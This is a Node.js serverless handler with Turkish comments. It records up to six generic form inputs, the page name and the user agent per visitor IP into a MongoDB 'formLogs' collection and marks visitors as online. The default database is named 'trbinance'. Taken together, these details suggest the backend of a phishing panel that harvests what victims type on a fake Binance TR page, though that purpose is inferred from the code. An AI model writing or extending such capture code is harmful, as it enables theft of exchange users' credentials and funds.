const clientPromise = require('../lib/mongo');

async function readBody(req) {
  const chunks = [];
  return new Promise((resolve, reject) => {
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString() || '{}';
        resolve(JSON.parse(raw));
      } catch (err) {
        reject(err);
      }
    });
    req.on('error', reject);
  });
}

function getClientIp(req) {
  const header = req.headers['x-forwarded-for'] || req.headers['X-Forwarded-For'];
  if (header) {
    return header.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const body = await readBody(req);
    const { page, inputs } = body || {};

    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || req.headers['User-Agent'] || 'unknown';
    const now = new Date();

    const setFields = { 
      updatedAt: now,
      userAgent: String(userAgent).slice(0, 500)
    };

    if (page && typeof page === 'string') {
      setFields.page = page.slice(0, 120);
    }

    // Sadece gönderilen ve boş olmayan input alanlarını güncelle
    // Boş string gönderilirse MongoDB'deki değeri silme
    if (inputs && typeof inputs === 'object') {
      for (let i = 1; i <= 6; i += 1) {
        const key = `input${i}`;
        if (Object.prototype.hasOwnProperty.call(inputs, key)) {
          const value = inputs[key];
          // Sadece değer varsa ve boş string değilse güncelle
          if (value !== undefined && value !== null && String(value).trim() !== '') {
            setFields[key] = String(value).slice(0, 512);
          }
          // Boş string gönderilirse MongoDB'deki değeri koru (güncelleme)
        }
      }
    }

    if (Object.keys(setFields).length === 1) {
      return res.status(400).json({ error: 'Nothing to update' });
    }

    // Retry mekanizması ile MongoDB işlemini yap - kayıt garanti edilene kadar dene
    let retryCount = 0;
    const maxRetries = 5;
    const retryDelay = 1000; // 1 saniye
    
    let success = false;
    let lastError;
    
    while (retryCount < maxRetries && !success) {
      try {
        const client = await clientPromise;
        
        // Bağlantı kontrolü - ping ile test et
        try {
          await client.db('admin').command({ ping: 1 });
        } catch (pingErr) {
          if (retryCount < maxRetries - 1) {
            console.log(`MongoDB connection check failed, retrying... (${retryCount + 1}/${maxRetries})`);
            await new Promise(resolve => setTimeout(resolve, retryDelay * (retryCount + 1)));
            retryCount++;
            continue;
          }
        }
        
        const db = client.db(process.env.MONGODB_DB || 'trbinance');
        const logs = db.collection('formLogs');
        const sessions = db.collection('sessions');

        // MongoDB'ye kaydın başarıyla yapıldığından emin ol
        const result = await logs.updateOne(
          { ip },
          {
            $set: setFields
          },
          { upsert: false }
        );

        // Response dönen kullanıcıyı sessions'a da ekle (online yap)
        if (result.acknowledged && result.matchedCount > 0) {
          await sessions.updateOne(
            { ip },
            {
              $set: {
                ip,
                lastSeen: now
              }
            },
            { upsert: true }
          ).catch(err => console.error('Session update failed', err));
        }
        
        success = true;
      } catch (err) {
        lastError = err;
        retryCount++;
        
        const isConnectionError = 
          err.message?.includes('timeout') ||
          err.message?.includes('ECONNREFUSED') ||
          err.message?.includes('ENOTFOUND') ||
          err.message?.includes('MongoServerSelectionError') ||
          err.message?.includes('connection');
        
        if (isConnectionError && retryCount < maxRetries) {
          console.log(`MongoDB operation failed, retrying... (${retryCount}/${maxRetries}): ${err.message}`);
          await new Promise(resolve => setTimeout(resolve, retryDelay * retryCount));
        } else {
          // Retry yapılamayacak hata veya max retry'a ulaşıldı
          break;
        }
      }
    }
    
    if (!success) {
      console.error(`MongoDB operation failed after ${retryCount} attempts:`, lastError?.message);
      return res.status(500).json({ error: 'Database write failed after retries' });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Log page update error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};


